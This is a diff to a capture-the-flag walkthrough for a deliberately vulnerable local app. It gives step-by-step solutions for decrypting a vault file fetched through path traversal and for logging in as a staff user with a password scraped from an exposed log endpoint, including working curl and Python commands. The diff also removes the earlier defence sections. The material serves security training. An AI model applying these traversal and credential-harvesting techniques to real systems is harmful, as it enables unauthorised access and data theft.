@@ -354,161 +354,147 @@ read-only endpoint can still read arbitrary columns from the database.
 
 ---
 
-## Flag 5 -- RSA-512 + AES-256-GCM (A02)
+## Flag 5 -- Decrypt the vault (A02)
+
+You already have two strings from earlier flags:
+
+- `DR_API_KEY_PART1` from Flag 1: `dr-part1-3d7fa8c2b6e04915`
+- `encryption_key_part2` from Flag 4: `dr-part2-7f1a9c5e3b8d4a6f`
+
+The vault's own footer tells you `AES key = SHA-256(part1 || part2)`. Use that.
 
 ### Steps
 
-1. **Download the vault file for your user.** Same traversal as Flag 2:
+1. Download your vault file (same traversal as Flag 2):
    ```bash
    curl -sb "$COOKIE_JAR" \
      'http://localhost:3003/api/files/download?name=....//....//data/vault/classified-trial-results-abcd12.enc' \
      -o vault.enc
    ```
-2. **Read the envelope header.** It tells you the scheme:
-   ```
-   # Scheme: RSA-512 + AES-256-GCM hybrid
-   [ALG] hybrid: rsa-512/pkcs1v15 wraps aes-256-gcm
-   [WRAPPED_KEY_B64] ...
-   [IV_B64] ...
-   [CIPHERTEXT_B64] ...
-   ```
-3. **Choose a decryption path.** There are two, take either.
-
-### Path A: factor the RSA-512 modulus
-
-1. Download the document public key:
-   ```bash
-   curl -sb "$COOKIE_JAR" \
-     'http://localhost:3003/api/files/download?name=....//....//app/keys/doc-public.pem' \
-     -o doc-public.pem
-   ```
-2. Extract `n` from the PEM:
-   ```bash
-   openssl rsa -pubin -in doc-public.pem -text -noout
-   ```
-3. Factor `n`. RSA-512 is broken; `n` is 155 decimal digits. Any of:
-   - Paste `n` into [factordb.com](http://factordb.com/). Often cached.
-   - [Alpertron ECM](https://www.alpertron.com.ar/ECM.HTM) in-browser.
-   - `msieve -q -v <n>` locally (about a minute on a modern laptop).
-   - `yafu "factor(<n>)"`.
-4. Derive `d` from `(p, q, e)` and decrypt in Python:
-   ```python
-   from Crypto.PublicKey import RSA
-   from Crypto.Cipher import PKCS1_v1_5, AES
-   import base64, re
-
-   p, q, e = <p>, <q>, 65537
-   phi = (p-1)*(q-1)
-   d = pow(e, -1, phi)
-   priv = RSA.construct((p*q, e, d, p, q))
-
-   blob = open('vault.enc').read()
-   wrap = base64.b64decode(re.search(r'\[WRAPPED_KEY_B64\]\s+(\S+)', blob).group(1))
-   iv   = base64.b64decode(re.search(r'\[IV_B64\]\s+(\S+)',         blob).group(1))
-   ct   = base64.b64decode(re.search(r'\[CIPHERTEXT_B64\]\s+(\S+)', blob).group(1))
-
-   aes_key = PKCS1_v1_5.new(priv).decrypt(wrap, None)
-   pt = AES.new(aes_key, AES.MODE_GCM, nonce=iv).decrypt_and_verify(ct[:-16], ct[-16:])
-   print(pt.decode())
-   ```
-
-### Path B: rebuild the AES key directly
-
-1. Read the footer of `vault.enc`. It says:
-   ```
-   # 3. Alternatively: the AES key = SHA-256(DR_API_KEY_PART1 || encryption_key_part2).
-   ```
-2. You already have both halves:
-   - `DR_API_KEY_PART1` from Flag 1 (`dr-part1-3d7fa8c2b6e04915`)
-   - `encryption_key_part2` from Flag 4's SQLi
-     (`dr-part2-7f1a9c5e3b8d4a6f`)
-3. Hash them and decrypt:
+2. Decrypt with Python (`pip install cryptography`):
    ```python
    import hashlib, base64, re
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
 
    part1 = "dr-part1-3d7fa8c2b6e04915"
    part2 = "dr-part2-7f1a9c5e3b8d4a6f"
-   aes_key = hashlib.sha256((part1 + part2).encode()).digest()
+   key = hashlib.sha256((part1 + part2).encode()).digest()
 
    blob = open('vault.enc').read()
    iv = base64.b64decode(re.search(r'\[IV_B64\]\s+(\S+)', blob).group(1))
    ct = base64.b64decode(re.search(r'\[CIPHERTEXT_B64\]\s+(\S+)', blob).group(1))
 
-   pt = AESGCM(aes_key).decrypt(iv, ct, None)
-   print(pt.decode())
+   print(AESGCM(key).decrypt(iv, ct, None).decode())
    ```
+3. Read Flag 5 from the output (line starting `Flag (audit receipt):`).
 
-Either path gives you the decrypted text, which includes
-`Flag (audit receipt): durham-drflag5{...}` and a hint that the logs
-matter for Flag 6.
-
-### Why it works
-
-RSA-512 has been known-bad since 1999 (CWI factored RSA-155). Keeping
-it "just for this release" is the kind of decision that sits in a memo
-and never gets closed. The second path exists because the engineers
-kept an off-band recovery method: if you know both halves, you know
-the key, no RSA needed.
-
-### Defence
-
-- Move to RSA-3072 or ECC for the key wrap.
-- Delete the "alternatively, compute the AES key from these two strings"
-  comment. Production keys should not be derivable from environment
-  strings.
+> The vault can also be cracked by factoring the RSA-512 modulus
+> (`factordb.com` / `msieve`) and unwrapping the AES key that way. Same
+> flag, longer route. Only bother if you're demonstrating the intended
+> RSA-512 break.
 
 ---
 
-## Flag 6 -- Log-file password leak + staff login (A09)
+## Flag 6 -- Log leak + staff login (A09)
 
-### Steps
+The idea: Actuator's `logfile` endpoint is open and Amir's password leaked into a DEBUG line. Log in as Amir on the **staff** portal, then open `/incident-report` while *also* carrying your player cookie so the page knows which user's flag to return.
 
-1. **Read the decrypted Flag 5 plaintext carefully.** It says the
-   incident timeline lives in the system logs.
-2. **Grab the log file.** Actuator's `logfile` endpoint is already open:
-   ```bash
-   curl -s http://localhost:3003/actuator/logfile | grep 'amir.patel'
-   ```
-3. **Find the leaked DEBUG line.** Among 40 routine log lines, one
-   from 2024-09-21 reads:
-   ```
-   DEBUG ... request body: {"username":"amir.patel","password":"DunholmCTO2024!"}
-   ```
-   Every other DEBUG line has the password redacted. This one slipped
-   past.
-4. **Log in at the staff console.** Do not drop your player cookie yet;
-   you need two cookies at the final step. Save the staff cookie in a
-   separate jar:
-   ```bash
-   STAFF_JAR=$(mktemp)
-   curl -sc "$STAFF_JAR" -o /dev/null \
-        -X POST \
-        -d "username=amir.patel&password=DunholmCTO2024!" \
-        http://localhost:3003/staff-login
-   ```
-5. **Visit `/incident-report` with both cookies.** The player cookie
-   identifies which user's Flag 6 to return. The staff cookie unlocks
-   the page.
-   ```bash
-   curl -sb "$COOKIE_JAR" -b "$STAFF_JAR" \
-        http://localhost:3003/incident-report | grep drflag6
-   ```
+There are two ways to finish this flag. They do the same thing. **Solution A is easier** and is what most players should use. Solution B is the scripted version -- useful if you want to show a marker that Flag 3's forged JWT does not bypass Flag 6, or if you want to automate the chain.
+
+### Step 1 (shared) -- Grab the leaked password from the log
+
+```bash
+curl -s http://localhost:3003/actuator/logfile | grep amir.patel
+```
+
+Look for a DEBUG line that contains a `password` field, for example:
+
+```
+... DEBUG ... request body: {"username":"amir.patel","password":"DunholmCTO2024!"}
+```
+
+The password is `DunholmCTO2024!`. Ignore lines without a password field or lines where the password is blank/redacted.
+
+---
+
+### Solution A -- in a browser (easier)
+
+> Recommended. This is how an auditor would actually do it.
+
+1. In the same browser where you're already signed in as your player (`abcd12`, `efgh34`, or `ijkl56`) -- the same tab you used for Flags 1 to 5 -- open a new tab and go to `http://localhost:3003/staff-login`.
+2. Sign in with `amir.patel` / `DunholmCTO2024!`. You'll land on the staff area.
+3. Navigate to `http://localhost:3003/incident-report`. Flag 6 is in the page.
+
+Why this works: your player session (JWT cookie) is still in the browser, so `/incident-report` sees both cookies -- the JWT tells it which player's Flag 6 to print, and the staff session proves you authenticated as Amir.
+
+If you log out of your player session before logging in as Amir, the incident report has no player context to key the flag off. Keep both sessions live at the same time.
+
+---
+
+### Solution B -- scripted with curl
+
+You will need **two** cookie jars at the same time:
+
+- `$COOKIE_JAR` -- your player session (used since Flag 1)
+- `$STAFF_JAR` -- a new jar for Amir's staff session
+
+#### Step 2 -- Make sure your player cookie jar exists
+
+If you're in the same terminal you used for Flag 1, `$COOKIE_JAR` is still set and you can skip this step. If you opened a new terminal, redo it:
+
+```bash
+COOKIE_JAR=$(mktemp)
+curl -sc "$COOKIE_JAR" -X POST \
+     --data-urlencode 'username=abcd12' \
+     --data-urlencode 'password=<YOUR_PLAYER_PASSWORD>' \
+     http://localhost:3003/login
+```
+
+Sanity check -- this should print your real Flag 1, not the "authenticate to see..." placeholder:
+
+```bash
+curl -sb "$COOKIE_JAR" http://localhost:3003/actuator/info | grep drflag1
+```
+
+#### Step 3 -- Create the staff cookie jar and log in as Amir
+
+> Important (zsh): use **single quotes** around the `-d` argument. The `!` in the password triggers zsh history expansion inside double quotes and prints `dquote>` (waiting for a quote to close). Single quotes switch that off. If zsh keeps breaking the command across lines, paste it all on one line.
+
+```bash
+STAFF_JAR=$(mktemp)
+curl -sc "$STAFF_JAR" -o /dev/null -X POST --data-urlencode 'username=amir.patel' --data-urlencode 'password=DunholmCTO2024!' http://localhost:3003/staff-login
+```
+
+Sanity check -- the jar should now contain a `JSESSIONID`:
+
+```bash
+cat "$STAFF_JAR"
+```
+
+If the file is empty or only has the header comments, the login failed -- recheck the password from Step 1 and that the command landed on one line.
+
+#### Step 4 -- Hit `/incident-report` with both cookies
+
+`-b` sends existing cookies with the request. Pass it twice so the call carries both jars:
+
+```bash
+curl -sb "$COOKIE_JAR" -b "$STAFF_JAR" http://localhost:3003/incident-report | grep drflag6
+```
+
+You should get a single line containing `durham-drflag6{<hex>_abcd12}`. That is Flag 6.
+
+#### Troubleshooting
+
+- **`grep drflag6` prints nothing**: one of the two cookies isn't being sent. Run the command without `| grep drflag6` to see the raw response. If you get the staff login page, your staff cookie is stale -- redo Step 3. If you get a page with no flag, your player cookie is stale -- redo Step 2.
+- **Sanity check in Step 2 still shows "authenticate to see..."**: your player login failed. Common causes: a newline got pasted into the password, or you hit the rate limiter (wait two minutes and retry).
+- **`dquote>` appears after a curl command**: you used double quotes with a `!` in the password. Press `Ctrl+C` to abort and re-run with single quotes or `--data-urlencode`.
+- **`zsh: command not found: --data-urlencode`**: your paste broke the `\` line continuations. Put the whole curl command on one line.
+
+---
 
 ### Why the Flag 3 forgery does not help here
 
-`IncidentController` reads the staff identity from a server-side
-`HttpSession` attribute, not from the JWT cookie. The only way to set
-that attribute is a real `POST /staff-login` where Spring Security
-checks the bcrypt hash of the posted password. Forging a JWT with
-`sub: "amir.patel"` does not put anything in the session.
-
-### Defence
-
-- Do not log request bodies at DEBUG in production. Drop the
-  `com.dunholm.service.AuthService` logger to `INFO`.
-- Route any log line that contains a password field through a redactor
-  before it reaches disk.
+`IncidentController` reads the staff identity from a server-side `HttpSession` attribute (`STAFF_USER`), not from the JWT cookie. The only way to set that attribute is a real `POST /staff-login` where Spring checks the bcrypt hash of the submitted password. Forging a JWT with `sub: "amir.patel"` does not put anything in the session.
 
 ---
 
